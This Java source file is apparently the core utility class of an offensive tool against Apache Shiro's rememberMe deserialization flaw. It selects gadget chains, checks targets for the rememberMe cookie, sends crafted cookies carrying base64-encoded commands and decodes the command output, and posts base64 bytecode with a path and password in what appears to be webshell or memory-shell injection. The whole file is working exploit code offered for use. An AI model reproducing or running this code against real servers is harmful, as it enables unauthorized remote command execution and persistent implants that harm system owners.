package fun.fireline.exp.apache.shiro.exp;



import fun.fireline.exp.apache.shiro.deser.frame.FramePayload;
import fun.fireline.exp.apache.shiro.deser.frame.Shiro;
import fun.fireline.exp.apache.shiro.deser.payloads.ObjectPayload;
import fun.fireline.exp.apache.shiro.deser.plugins.keytest.KeyEcho;
import fun.fireline.exp.apache.shiro.utils.HttpUtil;
import fun.fireline.exp.apache.shiro.utils.UtilMethod;
import org.apache.http.Header;
import org.apache.http.HttpResponse;

import javax.xml.bind.DatatypeConverter;
import java.io.UnsupportedEncodingException;
import java.net.HttpURLConnection;
import java.util.HashMap;
import java.util.List;
import java.util.Map;

/**
 * @className DserUtil
 * @Description 反序列化工具类, 目前主要支持框架为Shiro
 * @Author JF
 * @Date 2020/9/11 11:08
 * @Version 1.0
 **/
public class DserUtil {
    public static int timeout = 10000;

    public static Object principal = null;
    public static ObjectPayload<?> gadgetpayload = null;
    public static FramePayload<?> genpayload = null;
    public static Integer aesCipherType = 0;

    static {
        principal = KeyEcho.getObject();
    }

    public static void init_gen(String gadgetOption, String framename) throws IllegalAccessException, InstantiationException {
        // gadget 选择
        Class<? extends ObjectPayload> gadgetClazz = ObjectPayload.Utils.getPayloadClass(gadgetOption);
        DserUtil.gadgetpayload = gadgetClazz.newInstance();

        // 框架封装序列化数据生成最终payload
        final Class<? extends FramePayload> payloadClass = FramePayload.Utils.getPayloadClass(framename);
        DserUtil.genpayload = (Shiro) payloadClass.newInstance();
    }


    public static boolean rememberMe(String targeturl, int timeout) {
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Cookie", "rememberMe=1");

        HttpURLConnection conn = HttpUtil.get(targeturl, null, headers, timeout, timeout, "utf-8");


        Map<String, List<String>> resheaders = conn.getHeaderFields();
        if (resheaders.containsKey("Set-Cookie")) {
            List<String> list = resheaders.get("Set-Cookie");
            for (String item : list) {
                if (item.contains("rememberMe")) {
                    return true;
                }
            }
        }
        conn.disconnect();
        return false;
    }

    public static String guessEncoding(byte[] bytes) {
        String DEFAULT_ENCODING = "UTF-8";
        org.mozilla.universalchardet.UniversalDetector detector =
                new org.mozilla.universalchardet.UniversalDetector(null);
        detector.handleData(bytes, 0, bytes.length);
        detector.dataEnd();
        String encoding = detector.getDetectedCharset();
        detector.reset();
        if (encoding == null) {
            encoding = DEFAULT_ENCODING;
        }
        return encoding;
    }

    public static String exec(String targeturl, String sendpayload, String command, int timeout) {
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Cookie", sendpayload);

        // 添加执行命令
        String base64Command = DatatypeConverter.printBase64Binary(command.getBytes());

        Map<String, String> params = new HashMap<String, String>();

        params.put("c", base64Command);

        HttpURLConnection conn = HttpUtil.post(targeturl, params, headers, timeout, timeout, "utf-8");

        String responseText = HttpUtil.getBody(conn, "utf-8");

        String result;
        try {
            result = responseText.split("\\$\\$\\$")[1];
        } catch (Exception e) {
            return null;
        }


        if (result.length() != 0) {

            byte[] b64bytes = org.apache.shiro.codec.Base64.decode(result);
            String defaultEncode = guessEncoding(b64bytes);

            try {
                return new String(b64bytes, defaultEncode);
            } catch (UnsupportedEncodingException e) {
                return new String(b64bytes);
            }
        } else {
            return null;
        }

    }

    public static boolean hasDeleteMe(String url,String cookie){
        boolean flag = false;
        HttpResponse response = UtilMethod.doHttpRequest(url,cookie);
        if(response != null){
            for (Header h : response.getAllHeaders()) {
                if (h.getName().contains("Set-Cookie")&&h.getValue().contains("rememberMe=deleteMe")) {
                    flag = true;
                }
            }
            if(response.getStatusLine().getStatusCode()==403|| response.getStatusLine().getStatusCode()>500){//有些网站多线程会503，然后就没有Set-Cookie了
                flag = true;
            }
        }else{
            flag = true;
        }
        return flag;
    }

    public static boolean execTest(String targeturl, String sendpayload, int timeout) {
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Cookie", sendpayload);

        HttpURLConnection conn = HttpUtil.get(targeturl, null, headers, timeout, timeout, "utf-8");
        // 判断teste回显echo返回头是否存在

        Map<String, List<String>> resheaders = conn.getHeaderFields();
        if (resheaders.containsKey("Set-Cookie")) {
            List<String> list = resheaders.get("Set-Cookie");
            for (String item : list) {
                if (item.contains("rememberMe")) {
                    return false;
                }
            }
        }
        return true;
    }

    public static String execInject(String targeturl, String rememberMe, String b64Bytecode, String injectPath, String injectPass, int timeout) {
        Map<String, String> headers = new HashMap<String, String>();
        headers.put("Cookie", rememberMe);

        // 添加post请求中base64字节码
        Map<String, String> params = new HashMap<String, String>();

        params.put("dy", b64Bytecode);
        params.put("path", injectPath);

        if (!"".equals(injectPass)) {
            params.put("p", injectPass);
        }

        HttpURLConnection conn = HttpUtil.post(targeturl, params, headers, timeout, timeout, "utf-8");
        String result = HttpUtil.getBody(conn, "utf-8");
        return result;
    }

}
